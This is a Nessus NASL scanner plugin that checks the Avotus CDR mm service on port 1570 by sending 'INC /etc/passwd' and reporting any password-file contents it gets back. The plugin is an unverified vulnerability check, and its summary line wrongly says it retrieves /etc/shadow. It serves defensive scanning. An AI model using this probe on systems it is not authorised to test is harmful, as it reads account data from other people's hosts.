#
# See the Nessus Scripts License for details
#

#---------------------------------------------------------------------------
# This plugin has not been verified - meaning that there MIGHT be no
# flaw in the mentionned product.

# Changes by Tenable:
# - Revised plugin title, output formatting (9/4/09)
# - changed family (9/6/09)


include("compat.inc");

if(description)
{
 script_id(11948);
 script_version ("$Revision: 1.9 $");
 script_xref(name:"OSVDB", value:"6978");

 script_name(english:"Avotus CDR mm Arbitrary File Retrieval");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"The script attempts to force the remote Avotus CDR mm service to include 
the file /etc/passwd accross the network." );
 script_set_attribute(attribute:"solution", value:
"The vendor has provided a fix for this issue to all customers. 
The fix will be included in future shipments and future versions of the 
product.
If an Avotus customer has any questions about this problem, they should 
contact support@avotus.com." );
 script_set_attribute(attribute:"risk_factor", value:"High" );

script_end_attributes();

 script_summary(english:"Retrieves /etc/shadow");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"Anonymous");
 script_family(english:"Misc.");
 script_dependencie("find_service1.nasl");
 script_require_ports(1570, "Services/avotus_mm");
 
 exit(0);
}

#
# The script code starts here
#

include("misc_func.inc");

cmd = string("INC /etc/passwd\n");


port = get_kb_item("Services/avotus_mm");
if(!port)port = 1570;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  send(socket:soc, data:cmd);
  res = recv(socket:soc, length:65535);
  if(egrep(pattern:"root:.*:0:[01]:", string:res))
   {
    report =  "
Here is an excerpt from the remote /etc/passwd file : 
" + res + '\n';
   security_hole(port:port, extra:report);
   }
  close(soc);
  }
}

